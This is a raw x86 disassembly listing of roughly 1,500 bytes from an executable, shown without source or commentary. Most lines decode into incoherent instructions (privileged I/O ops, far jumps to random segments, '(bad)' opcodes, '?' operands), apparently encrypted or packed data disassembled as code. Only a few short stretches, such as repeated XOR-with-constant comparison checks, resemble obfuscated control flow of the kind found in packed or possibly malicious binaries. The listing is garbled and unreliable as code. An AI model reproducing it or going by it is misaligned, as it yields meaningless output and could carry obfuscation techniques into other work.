  40b518:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b519:	call   0x6397:0x79ad9255
  40b520:	int    0x5a
  40b522:	cmp    BYTE PTR [edx+0x501c70af],bl
  40b528:	into   
  40b529:	sbb    dh,dh
  40b52b:	in     eax,0x2a
  40b52d:	stc    
  40b52e:	(bad)  
  40b52f:	aaa    
  40b530:	nop
  40b531:	fs fldlg2 
  40b534:	sahf   
  40b535:	xor    dl,BYTE PTR [eax+0x28]
  40b538:	jno    0x40b570
  40b53a:	xor    edi,DWORD PTR [eax-0x1c]
  40b53d:	mov    WORD PTR [esi],cs
  40b53f:	test   al,0x4b
  40b541:	push   ebp
  40b542:	es idiv dh
  40b545:	sbb    esp,DWORD PTR [ecx+0x66]
  40b548:	mov    ch,0x3d
  40b54a:	repnz or dh,cl
  40b54d:	jmp    0x4f2e:0x16776edb
  40b554:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b555:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b556:	int    0x5f
  40b558:	xchg   DWORD PTR [ecx],edi
  40b55a:	iret   
  40b55b:	or     al,BYTE PTR [eax+edx*8-0x4f1ceb9f]
  40b562:	jne    0x40b530
  40b564:	out    dx,al
  40b565:	sub    BYTE PTR [edi],0xdf
  40b568:	sub    DWORD PTR [ebp-0xb],ecx
  40b56b:	push   ecx
  40b56c:	mov    eax,0x2e0c1866
  40b571:	out    dx,eax
  40b572:	arpl   WORD PTR [ecx],ax
  40b574:	sbb    eax,0x219a122e
  40b579:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b57a:	lods   eax,DWORD PTR ds:[esi]
  40b57b:	or     bh,ah
  40b57d:	not    DWORD PTR [edx-0x6d8cffea]
  40b583:	int3   
  40b584:	mov    WORD PTR [eax],gs
  40b586:	push   ecx
  40b587:	(bad)  
  40b588:	mov    bl,0x2
  40b58a:	and    DWORD PTR [eax-0x39],ebp
  40b58d:	test   eax,0x5b12a996
  40b592:	xor    DWORD PTR [edi],ebx
  40b594:	ins    BYTE PTR es:[edi],dx
  40b595:	popf   
  40b596:	xchg   ebx,eax
  40b597:	fs jge 0x40b548
  40b59a:	call   0x3018b047
  40b59f:	inc    esi
  40b5a0:	test   al,0x10
  40b5a2:	push   0xffffffd0
  40b5a4:	lds    eax,FWORD PTR [ebx+0x1f]
  40b5a7:	jmp    0x40b5c6
  40b5a9:	mov    ch,0x36
  40b5ab:	jne    0x40b595
  40b5ad:	and    al,0x2c
  40b5af:	dec    DWORD PTR [ebx]
  40b5b1:	mov    al,al
  40b5b3:	jl     0x40b5ba
  40b5b5:	rcl    BYTE PTR [edx],1
  40b5b7:	xor    eax,0x3b297409
  40b5bc:	dec    esp
  40b5bd:	arpl   WORD PTR [ebp+0x6c048e9e],cx
  40b5c3:	xchg   edi,eax
  40b5c4:	retf   0xe8cd
  40b5c7:	fwait
  40b5c8:	inc    edx
  40b5c9:	out    0xb6,al
  40b5cb:	mov    esi,DWORD PTR [eax+ebp*8-0x318266c3]
  40b5d2:	ficom  WORD PTR [ecx+0x4edfdde7]
  40b5d8:	and    edx,ebx
  40b5da:	push   ebx
  40b5db:	xor    al,0x56
  40b5dd:	scas   al,BYTE PTR es:[edi]
  40b5de:	sub    bl,BYTE PTR [edx+0x61]
  40b5e1:	pushf  
  40b5e2:	test   DWORD PTR [ebx-0x728c7c9],0x939b6d40
  40b5ec:	cli    
  40b5ed:	adc    BYTE PTR [eax],bh
  40b5ef:	test   al,ah
  40b5f1:	cld    
  40b5f2:	dec    esp
  40b5f3:	push   ebp
  40b5f4:	mov    ecx,0x37f03ac0
  40b5f9:	push   esi
  40b5fa:	push   ebp
  40b5fb:	mov    ds:0x3bd4c042,eax
  40b600:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b601:	lahf   
  40b602:	or     eax,0x48069c02
  40b607:	cmc    
  40b608:	mov    cl,0xe3
  40b60a:	push   cs
  40b60b:	push   edi
  40b60c:	push   edi
  40b60d:	sub    BYTE PTR ds:0x423ac6dd,bl
  40b613:	pop    DWORD PTR [ebp+0x75]
  40b616:	rcr    dh,0x53
  40b619:	test   eax,0x11f50b6f
  40b61e:	jmp    0x40b606
  40b620:	cmc    
  40b621:	mov    ecx,0x2e8f4fe8
  40b626:	add    esp,ebp
  40b628:	icebp  
  40b629:	xchg   BYTE PTR [edx+ebp*4],cl
  40b62c:	adc    bh,bh
  40b62e:	rcr    bh,1
  40b630:	cs stc 
  40b632:	jae    0x40b5ee
  40b634:	cdq    
  40b635:	inc    ebp
  40b636:	das    
  40b637:	mov    esi,0xfbf0731a
  40b63c:	push   ds
  40b63d:	xchg   ebx,eax
  40b63e:	cmp    al,0xf1
  40b640:	or     ebx,DWORD PTR [ebp-0x69b9d68c]
  40b646:	push   eax
  40b647:	jnp    0x40b665
  40b649:	push   esi
  40b64a:	push   cs
  40b64b:	and    DWORD PTR [edx],eax
  40b64d:	iret   
  40b64e:	mov    dh,0x12
  40b650:	enter  0xdeb9,0xd4
  40b654:	xor    esi,DWORD PTR [eax]
  40b656:	xchg   BYTE PTR [edi-0x3950f038],cl
  40b65c:	retf   0x7f8a
  40b65f:	fldcw  WORD PTR [ebx]
  40b661:	lea    ebp,[ebp+0x3cb637b2]
  40b667:	cwde   
  40b668:	lods   al,BYTE PTR ds:[esi]
  40b669:	push   0xffffff90
  40b66b:	xchg   esi,eax
  40b66c:	push   esp
  40b66d:	data16 (bad) 
  40b66f:	lods   eax,DWORD PTR ds:[esi]
  40b670:	retf   
  40b671:	mov    ch,0x7d
  40b673:	ja     0x40b636
  40b675:	jmp    0xefc1:0xb622cc7f
  40b67c:	lods   eax,DWORD PTR ds:[esi]
  40b67d:	das    
  40b67e:	sbb    BYTE PTR [ecx-0x42],bh
  40b681:	call   0xdb18042e
  40b686:	addr16 pop esp
  40b688:	or     edx,DWORD PTR [edi]
  40b68a:	neg    edi
  40b68c:	lods   eax,DWORD PTR ds:[esi]
  40b68d:	iret   
  40b68e:	ret    
  40b68f:	mov    bh,0x59
  40b691:	stos   BYTE PTR es:[edi],al
  40b692:	pop    ecx
  40b693:	mov    dh,0x96
  40b695:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b696:	cmp    eax,0xdbe9adfb
  40b69b:	(bad)  
  40b69c:	(bad)  [esi+0x7d]
  40b69f:	and    al,dl
  40b6a1:	jno    0x40b65c
  40b6a3:	scas   al,BYTE PTR es:[edi]
  40b6a4:	inc    esi
  40b6a5:	adc    DWORD PTR [edi-0x74],eax
  40b6a8:	scas   eax,DWORD PTR es:[edi]
  40b6a9:	sbb    BYTE PTR ds:0x2e7ea946,al
  40b6af:	jb     0x40b721
  40b6b1:	inc    edi
  40b6b2:	add    al,BYTE PTR cs:[ebx]
  40b6b5:	xchg   BYTE PTR [ebx-0x97cbf83],ch
  40b6bb:	fild   QWORD PTR [ebx+0x48]
  40b6be:	daa    
  40b6bf:	repnz lock rol BYTE PTR [esi],1
  40b6c3:	call   DWORD PTR [esi-0x2bfc24ca]
  40b6c9:	pop    ebx
  40b6ca:	xchg   al,bh
  40b6cc:	jmp    0x717a:0x1815f59e
  40b6d3:	mov    eax,0x874c53a9
  40b6d8:	inc    esi
  40b6d9:	mov    ds:0xb00efac3,al
  40b6de:	mov    BYTE PTR [ebp-0x46],0x53
  40b6e2:	sar    DWORD PTR [ecx-0x1e084348],cl
  40b6e8:	xchg   ebp,eax
  40b6e9:	repnz cwde 
  40b6eb:	je     0x40b708
  40b6ed:	test   BYTE PTR [eax-0x3075b069],0xa2
  40b6f4:	out    dx,al
  40b6f5:	push   edx
  40b6f6:	lods   eax,DWORD PTR ds:[esi]
  40b6f7:	xchg   esp,eax
  40b6f8:	pop    esi
  40b6f9:	mov    dl,0x4b
  40b6fb:	imul   ecx,DWORD PTR [ecx],0xe
  40b6fe:	mov    esp,0xa537908b
  40b703:	outs   dx,DWORD PTR ds:[esi]
  40b704:	daa    
  40b705:	pop    ebp
  40b706:	das    
  40b707:	xchg   ebx,eax
  40b708:	sahf   
  40b709:	xchg   ebp,eax
  40b70a:	aas    
  40b70b:	jae    0x40b75e
  40b70d:	shr    DWORD PTR [edx+0x69731103],1
  40b713:	push   cs
  40b714:	sub    DWORD PTR [esi-0xc],esi
  40b717:	repnz sub ebx,DWORD PTR [edx]
  40b71a:	xor    DWORD PTR [ebx-0x37],ebp
  40b71d:	push   es
  40b71e:	jae    0x40b6e8
  40b720:	fild   WORD PTR [ebx]
  40b722:	mov    ebx,?
  40b724:	push   cs
  40b725:	adc    ah,BYTE PTR [ebx]
  40b727:	cmp    al,0xaf
  40b729:	loopne 0x40b7a3
  40b72b:	xchg   esi,eax
  40b72c:	test   DWORD PTR [ebx-0x47],esi
  40b72f:	(bad)  
  40b730:	mov    ch,0x3e
  40b732:	repnz popa 
  40b734:	dec    ebx
  40b735:	fstp   st(0)
  40b737:	mov    ebx,0x2c40e580
  40b73c:	test   al,0x9d
  40b73e:	push   ebp
  40b73f:	add    al,BYTE PTR [edx]
  40b741:	pushf  
  40b742:	sahf   
  40b743:	add    eax,0x659629bc
  40b748:	pop    ebx
  40b749:	sbb    eax,0xefec09e3
  40b74e:	sbb    eax,0xf4339a6e
  40b753:	jmp    0xffe4:0x1c3d172a
  40b75a:	jne    0x40b72c
  40b75c:	push   DWORD PTR [ebp+0xc]
  40b75f:	call   0x410212
  40b764:	mov    eax,DWORD PTR [ebp-0x4]
  40b767:	mov    ecx,DWORD PTR [ebp-0x8]
  40b76a:	xor    eax,0x7510854
  40b76f:	add    eax,ebx
  40b771:	cmp    ecx,eax
  40b773:	jne    0x40b9f9
  40b779:	jmp    0x40b9dc
  40b77e:	mov    edi,0x716ef17f
  40b783:	jo     0x40b7c6
  40b785:	das    
  40b786:	pushf  
  40b787:	dec    edi
  40b788:	je     0x40b75f
  40b78a:	mov    al,ds:0xb2d44f87
  40b78f:	(bad)  
  40b790:	jle    0x40b810
  40b792:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b796:	mov    dl,BYTE PTR [eax+0x66056aaa]
  40b79c:	jne    0x40b7c8
  40b79e:	and    ah,BYTE PTR [ecx-0x57ce6af4]
  40b7a4:	dec    edx
  40b7a5:	xchg   BYTE PTR [ecx+edx*8-0x3c],ch
  40b7a9:	retf   0x2ca5
  40b7ac:	cwde   
  40b7ad:	sbb    bl,bl
  40b7af:	jnp    0x40b7f3
  40b7b1:	inc    ebx
  40b7b2:	aaa    
  40b7b3:	aaa    
  40b7b4:	lods   al,BYTE PTR ds:[esi]
  40b7b5:	pop    esp
  40b7b6:	not    DWORD PTR [edx-0x7c1f373e]
  40b7bc:	hlt    
  40b7bd:	in     eax,0x30
  40b7bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7c0:	and    edx,DWORD PTR ds:0x754409c0
  40b7c6:	ret    0x9f1a
  40b7c9:	cli    
  40b7ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7cb:	push   ss
  40b7cc:	das    
  40b7cd:	add    DWORD PTR [ebp+0xad607f4],edi
  40b7d3:	je     0x40b7c9
  40b7d5:	sub    eax,0xcece660c
  40b7da:	lea    ecx,[edi+0x6c]
  40b7dd:	xor    ah,0x17
  40b7e0:	dec    esi
  40b7e1:	or     al,0xf
  40b7e3:	pop    ds
  40b7e4:	push   ss
  40b7e5:	and    BYTE PTR [esi+ecx*8-0x268da309],0x9e
  40b7ed:	mov    ebp,0x970193c3
  40b7f2:	rcr    BYTE PTR [edi+ebp*1],cl
  40b7f5:	mov    bl,0x3c
  40b7f7:	bound  esp,QWORD PTR [eax]
  40b7f9:	and    al,dl
  40b7fb:	inc    esi
  40b7fc:	pop    edx
  40b7fd:	jnp    0x40b7d9
  40b7ff:	pop    esi
  40b800:	pop    esp
  40b801:	mov    dl,0x3e
  40b803:	sbb    BYTE PTR [esi+0x3615258d],dl
  40b809:	inc    eax
  40b80a:	pop    DWORD PTR [eax-0x4e]
  40b80d:	fcomp  st(6)
  40b80f:	push   esi
  40b810:	stc    
  40b811:	shl    eax,1
  40b813:	inc    ecx
  40b814:	cmp    DWORD PTR [ecx],ebx
  40b816:	adc    al,BYTE PTR [edx+0x28]
  40b819:	test   BYTE PTR [eax-0xb],bl
  40b81c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b81d:	aas    
  40b81e:	jge    0x40b862
  40b820:	mov    WORD PTR [edi+0x16c7cca6],ds
  40b826:	mov    ?,WORD PTR [ebx-0x37]
  40b829:	pusha  
  40b82a:	mov    DWORD PTR [edi+0x5ff74866],ebx
  40b830:	sbb    al,0xfa
  40b832:	adc    BYTE PTR [edi-0x6d47337a],al
  40b838:	mov    edx,0xf1c294ef
  40b83d:	jae    0x40b865
  40b83f:	test   BYTE PTR [edx+ecx*1],ah
  40b842:	je     0x40b80d
  40b844:	pop    ss
  40b845:	jne    0x40b81e
  40b847:	ret    0x1920
  40b84a:	inc    DWORD PTR [edi]
  40b84c:	pop    DWORD PTR [ebx+0x70]
  40b84f:	es loopne 0x40b848
  40b852:	gs pop ebp
  40b854:	rcl    DWORD PTR [esi],cl
  40b856:	data16 clc 
  40b858:	iret   
  40b859:	jl     0x40b89b
  40b85b:	cld    
  40b85c:	ret    
  40b85d:	lds    eax,FWORD PTR [ebx+0x18]
  40b860:	xor    BYTE PTR [esi+0x60],ah
  40b863:	push   ecx
  40b864:	sti    
  40b865:	sub    BYTE PTR [ecx+0x1f],al
  40b868:	cmp    ecx,DWORD PTR [edi-0x59]
  40b86b:	and    eax,0x7f739706
  40b870:	push   0xda595048
  40b875:	lock xchg bh,ah
  40b878:	ss inc ebp
  40b87a:	ins    DWORD PTR es:[edi],dx
  40b87b:	mov    ds:0x17182e1a,al
  40b880:	retf   0xc285
  40b883:	shl    eax,0x1
  40b886:	ins    BYTE PTR es:[edi],dx
  40b887:	and    BYTE PTR [esp+esi*2+0xc],dl
  40b88b:	xchg   ebx,eax
  40b88c:	test   al,0x1c
  40b88e:	pop    edi
  40b88f:	hlt    
  40b890:	add    eax,0x96a530c5
  40b895:	xchg   ebp,eax
  40b896:	mov    ah,0x69
  40b898:	je     0x40b869
  40b89a:	sbb    BYTE PTR [edx+eax*4-0x2a],bh
  40b89e:	gs in  al,dx
  40b8a0:	xor    bh,BYTE PTR [ecx+ebx*2+0x6871b77c]
  40b8a7:	in     eax,dx
  40b8a8:	mov    ah,bl
  40b8aa:	mov    ds:0xc651de33,eax
  40b8af:	mov    BYTE PTR [edi-0x5120463d],cl
  40b8b5:	jle    0x40b8f9
  40b8b7:	(bad)  
  40b8b8:	popa   
  40b8b9:	adc    al,0x82
  40b8bb:	fsub   DWORD PTR [ecx+0x4]
  40b8be:	lea    ecx,[ebx-0xc]
  40b8c1:	std    
  40b8c2:	dec    ebp
  40b8c3:	jl     0x40b8f7
  40b8c5:	pop    ebx
  40b8c6:	aam    0x7b
  40b8c8:	arpl   sp,di
  40b8ca:	aam    0x1
  40b8cc:	bound  ebp,QWORD PTR [ebx-0x8]
  40b8cf:	and    eax,0x3a2699f5
  40b8d4:	test   al,0x74
  40b8d6:	add    eax,0x23d0352f
  40b8db:	cmp    ah,0x40
  40b8de:	sti    
  40b8df:	sahf   
  40b8e0:	repnz cmp BYTE PTR [esi],0x7b
  40b8e4:	mov    ds:0x6070f939,eax
  40b8e9:	inc    edx
  40b8ea:	icebp  
  40b8eb:	jae    0x40b898
  40b8ed:	pop    ds
  40b8ee:	cdq    
  40b8ef:	pop    edx
  40b8f0:	sbb    al,0xd7
  40b8f2:	mov    ds:0x3dffcec,al
  40b8f7:	cdq    
  40b8f8:	mov    al,0x16
  40b8fa:	jmp    0xebf7:0xb17bae54
  40b901:	daa    
  40b902:	ins    DWORD PTR es:[edi],dx
  40b903:	xor    BYTE PTR [edx+0x28e7d734],bh
  40b909:	xchg   edx,eax
  40b90a:	pop    eax
  40b90b:	cli    
  40b90c:	test   BYTE PTR [esi],bh
  40b90e:	sub    al,0x4a
  40b910:	mov    edx,0xdf7e895c
  40b915:	adc    bl,BYTE PTR [esi+0x4e]
  40b918:	test   BYTE PTR [esi+ebp*4+0x8ddcc02],al
  40b91f:	sub    al,ch
  40b921:	push   ebx
  40b922:	out    dx,eax
  40b923:	jns    0x40b959
  40b925:	jg     0x40b8b2
  40b927:	(bad)  
  40b928:	fild   WORD PTR [edx]
  40b92a:	dec    ebx
  40b92b:	push   ds
  40b92c:	and    BYTE PTR [edx+0x75],bh
  40b92f:	pop    es
  40b930:	sub    BYTE PTR [eax],ch
  40b932:	lods   al,BYTE PTR ds:[esi]
  40b933:	ja     0x40b8dc
  40b935:	les    ebx,FWORD PTR [eax+0x11]
  40b938:	out    dx,eax
  40b939:	inc    esp
  40b93a:	mov    al,BYTE PTR [esi-0x68aef65c]
  40b940:	mov    BYTE PTR [eax],al
  40b942:	cld    
  40b943:	dec    ebp
  40b944:	xchg   edi,eax
  40b945:	icebp  
  40b946:	in     eax,0x28
  40b948:	pop    edx
  40b949:	js     0x40b95d
  40b94b:	mov    esi,?
  40b94d:	shr    dh,1
  40b94f:	ja     0x40b92c
  40b951:	cmp    BYTE PTR ds:0x993044e9,bl
  40b957:	ja     0x40b940
  40b959:	in     al,dx
  40b95a:	mov    cl,0x5
  40b95c:	cld    
  40b95d:	push   es
  40b95e:	xchg   DWORD PTR [eax],edi
  40b960:	dec    esp
  40b961:	ja     0x40b982
  40b963:	mov    esi,eax
  40b965:	mov    ebp,0x631516c7
  40b96a:	dec    edx
  40b96b:	or     al,BYTE PTR [esi+0x4d8bba12]
  40b971:	cwde   
  40b972:	dec    ebx
  40b973:	rol    BYTE PTR [eax+edx*8],cl
  40b976:	int3   
  40b977:	push   eax
  40b978:	ror    DWORD PTR fs:[ebx+0x1b6262ba],0x5b
  40b980:	addr16 push ds
  40b982:	shr    eax,0x49
  40b985:	cwde   
  40b986:	enter  0x9002,0xdc
  40b98a:	pusha  
  40b98b:	test   al,0x5d
  40b98d:	add    bh,BYTE PTR [edx-0x7e2fb0f]
  40b993:	add    ecx,DWORD PTR [eax-0x7c]
  40b996:	cmc    
  40b997:	ss in  eax,0xa0
  40b99a:	and    al,0xd3
  40b99c:	int    0x29
  40b99e:	hlt    
  40b99f:	iret   
  40b9a0:	lds    esp,FWORD PTR [ebx-0x124db912]
  40b9a6:	aas    
  40b9a7:	push   ebp
  40b9a8:	xrelease mov BYTE PTR [edx+eax*2],dh
  40b9ac:	cmp    BYTE PTR [edi+edx*2-0x12],ah
  40b9b0:	sbb    ecx,0xf67c549e
  40b9b6:	mov    ds:0xf3bf4ae9,al
  40b9bb:	popa   
  40b9bc:	inc    ecx
  40b9bd:	or     al,0x36
  40b9bf:	xor    DWORD PTR [edi+0x7d18678c],eax
  40b9c5:	pop    edx
  40b9c6:	pusha  
  40b9c7:	sub    al,0x1a
  40b9c9:	aad    0xad
  40b9cb:	or     al,0x2b
  40b9cd:	mov    ebp,0x9b2103c1
  40b9d2:	mov    dh,0x83
  40b9d4:	lods   eax,DWORD PTR ds:[esi]
  40b9d5:	mov    cl,0x5c
  40b9d7:	pop    ss
  40b9d8:	add    eax,0x8b66f243
  40b9dd:	inc    ebp
  40b9de:	loopne 0x40ba27
  40b9e0:	cmp    edi,eax
  40b9e2:	jb     0x40a46c
  40b9e8:	jmp    0x40bc6c
  40b9ed:	mov    eax,DWORD PTR [ebp-0x4]
  40b9f0:	xor    eax,esi
  40b9f2:	add    eax,ebx
  40b9f4:	jmp    0x40d598
  40b9f9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b9fc:	jmp    0x40bc5f
  40ba01:	test   BYTE PTR [ecx],ch
  40ba03:	popa   
  40ba04:	lahf   
  40ba05:	jno    0x40ba7e
  40ba07:	inc    eax
  40ba08:	xor    DWORD PTR [edi+ebp*8-0x1d6157f8],eax
  40ba0f:	paddsb mm7,QWORD PTR [ebp+edi*8+0x7e]
  40ba14:	jle    0x40ba4e
  40ba16:	jl     0x40ba96
  40ba18:	jle    0x40ba2e
  40ba1a:	mov    ebx,0xc0e82b4e
  40ba1f:	cs or  eax,0x1a89a5be
  40ba25:	and    ebx,esp
  40ba27:	popa   
  40ba28:	pop    esi
  40ba29:	int3   
  40ba2a:	dec    ebx
  40ba2b:	mov    ch,0x6c
  40ba2d:	fdiv   st(6),st
  40ba2f:	lods   al,BYTE PTR ds:[esi]
  40ba30:	or     eax,esp
  40ba32:	inc    esp
  40ba33:	imul   BYTE PTR [ebx+ebx*4-0x5d]
  40ba37:	ret    0x7956
  40ba3a:	mov    esp,DWORD PTR [edi+0x2043fd42]
  40ba40:	imul   esi,DWORD PTR [edi+0x4a],0xe4224875
  40ba47:	pop    edi
  40ba48:	aam    0x5b
  40ba4a:	rcl    DWORD PTR [ebx+esi*8],1
  40ba4d:	xor    ebx,esp
  40ba4f:	pop    edi
  40ba50:	rol    DWORD PTR [ebx],0x9
  40ba53:	inc    ah
  40ba55:	push   es
  40ba56:	pushf  
  40ba57:	push   es
  40ba58:	lahf   
  40ba59:	pop    ss
  40ba5a:	push   0xae9f697e
  40ba5f:	fdivr  QWORD PTR [ebp+0x26d63d46]
  40ba65:	push   es
  40ba66:	cmp    al,BYTE PTR [ebx-0x176b311b]
  40ba6c:	push   es
  40ba6d:	xor    eax,DWORD PTR [ecx+0x6a]
  40ba70:	stc    
  40ba71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba72:	xor    eax,0xc237a7d0
  40ba77:	dec    ebx
  40ba78:	cmp    DWORD PTR ds:[ebp+0x6d],0x4f
  40ba7d:	stc    
  40ba7e:	lea    edi,[ebx]
  40ba80:	fisubr WORD PTR [ebx]
  40ba82:	mov    ds:0x8a7fd34c,eax
  40ba87:	or     al,BYTE PTR [ebp-0x61]
  40ba8a:	jg     0x40bac2
  40ba8c:	cmp    esi,DWORD PTR [edx+ebp*4+0x77]
  40ba90:	loopne 0x40bb02
  40ba92:	cmp    al,0x21
  40ba94:	xchg   ebx,eax
  40ba95:	lods   al,BYTE PTR ds:[esi]
  40ba96:	(bad)  
  40ba97:	fisubr WORD PTR ds:0xbc37bf15
  40ba9d:	jnp    0x40bad1
  40ba9f:	cli    
  40baa0:	fnstcw WORD PTR [esi-0x17]
  40baa3:	icebp  
  40baa4:	jns    0x40bb22
  40baa6:	rcl    BYTE PTR [ecx+0x21],0x79
  40baaa:	das    
  40baab:	ins    BYTE PTR es:[edi],dx
  40baac:	ret    0x45a2
  40baaf:	mov    ds:0xa4f2c055,eax
  40bab4:	js     0x40ba70
  40bab6:	(bad)
  40baba:	fild   WORD PTR [ebp*2-0x6729edd7]
  40bac1:	ja     0x40ba5a
  40bac3:	jle    0x40bb14
  40bac5:	sbb    edx,eax
  40bac7:	sbb    al,0x3b
  40bac9:	outs   dx,BYTE PTR ds:[esi]
  40baca:	stos   BYTE PTR es:[edi],al
  40bacb:	sbb    BYTE PTR [esi+0x649d26e6],dh
  40bad1:	push   ss
  40bad2:	repnz rcr esi,1
  40bad5:	(bad)  
  40bad6:	arpl   WORD PTR [ecx+0x65],bx
  40bad9:	in     al,0xff
  40badb:	loope  0x40bb2c
  40badd:	xchg   edx,eax
  40bade:	sub    edi,edx
  40bae0:	inc    esp
  40bae1:	retf   
  40bae2:	nop
  40bae3:	jno    0x40bb5c
  40bae5:	jno    0x40baa7
  40bae7:	jb     0x40babc
  40bae9:	fs inc esp
  40baeb:	push   esp
  40baec:	jmp    0xc71d9cbe
  40baf1:	dec    edi
  40baf2:	inc    esi
  40baf3:	mov    ds:0xeadfc5fd,al
  40baf8:	mov    edx,0x2f8e7f80
  40bafd:	xchg   edi,eax
  40bafe:	sbb    esp,DWORD PTR [eax-0xfc84885]
  40bb04:	aaa    
  40bb05:	cmp    dl,ch
  40bb07:	mov    ebx,0xcf858173
  40bb0c:	mov    ah,0x2c
  40bb0e:	sbb    al,0xda
  40bb10:	inc    edx
  40bb11:	push   bx
  40bb13:	adc    al,0xf9
  40bb15:	pop    es
  40bb16:	loopne 0x40bae1
  40bb18:	add    BYTE PTR [edx+0x71b26e8f],0xdd
  40bb1f:	test   ax,0xfd60
  40bb23:	ins    BYTE PTR es:[edi],dx
  40bb24:	ja     0x40bb91
  40bb26:	cli    
  40bb27:	pop    edx
  40bb28:	inc    ecx
  40bb29:	inc    edx
  40bb2a:	add    al,0xa9
  40bb2c:	shld   DWORD PTR ds:0x9dffd143,esi,0xcb
  40bb34:	(bad)  
  40bb35:	js     0x40bb95
  40bb37:	xlat   BYTE PTR ds:[ebx]
  40bb38:	mov    al,BYTE PTR [ebx+ecx*2+0x33c922b3]
  40bb3f:	pop    ecx
  40bb40:	in     al,dx
  40bb41:	xor    al,0x78
  40bb43:	loop   0x40bb6e
  40bb45:	mov    ?,esp
  40bb47:	or     eax,0x4f4f7dc9
  40bb4c:	clc    
  40bb4d:	ss xor eax,0x887326cd
  40bb53:	xor    al,0x70
  40bb55:	mov    al,ds:0x99e4025d
  40bb5a:	stc    
  40bb5b:	sub    BYTE PTR [ebx-0x78d3ead6],cl
  40bb61:	int    0xca
  40bb63:	lods   eax,DWORD PTR ds:[esi]
  40bb64:	sbb    al,0xff
  40bb66:	dec    ebx
  40bb67:	(bad)  
  40bb68:	xor    eax,0x481e690f
  40bb6d:	add    dl,cl
  40bb6f:	jb     0x40bb19
  40bb71:	enter  0x688a,0x4c
  40bb75:	aad    0x4a
  40bb77:	ficomp DWORD PTR [edx+0x57]
  40bb7a:	xlat   BYTE PTR ds:[ebx]
  40bb7b:	jo     0x40bbba
  40bb7d:	mov    ds:0x4c481c61,eax
  40bb82:	sbb    DWORD PTR [esi],ebp
  40bb84:	lock pop edx
  40bb86:	(bad)  
  40bb87:	sub    ebp,esi
  40bb89:	or     BYTE PTR [esi+0x1d6efa46],ch
  40bb8f:	push   esi
  40bb90:	ja     0x40bb78
  40bb92:	cs loopne 0x40bb7a
  40bb95:	(bad)  
  40bb96:	call   0xb9b2:0x59704e62
  40bb9d:	mov    eax,0x25fc26a3
  40bba2:	cmp    edi,DWORD PTR ds:0xb8c50d3
  40bba8:	int3   
  40bba9:	sbb    ecx,0x7a
  40bbac:	mov    ds:0x94ef915f,al
  40bbb1:	ret    0x5eff
  40bbb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbb5:	xor    DWORD PTR [ecx],esp
  40bbb7:	lahf   
  40bbb8:	mov    cs,WORD PTR [edx-0x31]
  40bbbb:	push   eax
  40bbbc:	aas    
  40bbbd:	out    dx,al
  40bbbe:	jne    0x40bb5f
  40bbc0:	jmp    0xdad0:0x185cd625
  40bbc7:	or     al,0xe4
  40bbc9:	push   0x6e1c5de9
  40bbce:	adc    BYTE PTR [eax+0x1],ah
  40bbd1:	xor    eax,0xb8ab7624
  40bbd6:	fldcw  WORD PTR [ebx]
  40bbd8:	mov    ebp,0xf1164a29
  40bbdd:	inc    ebp
  40bbde:	add    DWORD PTR ds:0x82b0b6ec,0xadec592
  40bbe8:	mov    BYTE PTR [edx-0x18cd9415],ch
  40bbee:	arpl   WORD PTR [eax],ax
  40bbf0:	sub    esp,DWORD PTR [esi]
  40bbf2:	clc    
  40bbf3:	lock push 0xffffff8b
  40bbf6:	or     BYTE PTR [eax+0x24],bh
  40bbf9:	dec    ebp
  40bbfa:	add    ecx,DWORD PTR [edi+0x72]
  40bbfd:	mov    eax,ds:0xc66e9ecf
  40bc02:	in     eax,0x6b
  40bc04:	cmp    al,0x24
  40bc06:	mov    esi,0x572247c3
  40bc0b:	jecxz  0x40bc70
  40bc0d:	jp     0x40bbc5
  40bc0f:	pop    edx
  40bc10:	xchg   edi,eax
  40bc11:	in     eax,0x7d
  40bc13:	sbb    eax,0xa8a7f6a1
  40bc18:	push   ecx
  40bc19:	ret    0x91c9
  40bc1c:	add    eax,0x1126ccd4
  40bc21:	push   edx
  40bc22:	and    DWORD PTR [esi+0x5fd3acc4],esp
  40bc28:	sub    eax,0xb4d0de64
  40bc2d:	add    BYTE PTR [esp+ecx*4+0x36],bh
  40bc31:	cmp    eax,0x9eb7c47b
  40bc36:	mov    ch,0xb3
  40bc38:	scas   al,BYTE PTR es:[edi]
  40bc39:	mov    ecx,0x44dd7d2f
  40bc3e:	scas   eax,DWORD PTR es:[edi]
  40bc3f:	(bad)  
  40bc41:	popf   
  40bc42:	addr16 or sp,ax
  40bc46:	sar    BYTE PTR [edi],1
  40bc48:	or     dl,dh
  40bc4a:	push   ebx
  40bc4b:	popa   
  40bc4c:	test   DWORD PTR ss:[ebx+0x66],edi
  40bc50:	mov    edx,0xc00dbb3c
  40bc55:	les    ecx,FWORD PTR [edi+0x41]
  40bc58:	cmp    BYTE PTR [eax+0x578784ae],cl
  40bc5e:	jns    0x40bc6f
  40bc60:	mov    bh,0x4
  40bc62:	js     0x40bbef
  40bc64:	dec    ebp
  40bc65:	in     al,dx
  40bc66:	mov    eax,DWORD PTR [ecx+eax*4]
  40bc69:	mov    DWORD PTR [ebp+0xc],eax
  40bc6c:	mov    eax,DWORD PTR [ebp-0x4]
  40bc6f:	mov    ecx,DWORD PTR [ebp-0x8]
  40bc72:	xor    eax,0x7510854
  40bc77:	add    eax,ebx
  40bc79:	cmp    ecx,eax
  40bc7b:	jne    0x40bef1
  40bc81:	mov    eax,DWORD PTR [ebp-0x4]
  40bc84:	jmp    0x40bee7
  40bc89:	into   
  40bc8a:	mov    esp,0xb26ca26c
  40bc8f:	shl    BYTE PTR [eax+0x17],1
  40bc92:	stos   DWORD PTR es:[edi],eax
  40bc93:	mov    WORD PTR [eax],?
  40bc95:	sub    BYTE PTR [esi+ebp*8],bh
  40bc98:	xlat   BYTE PTR ds:[ebx]
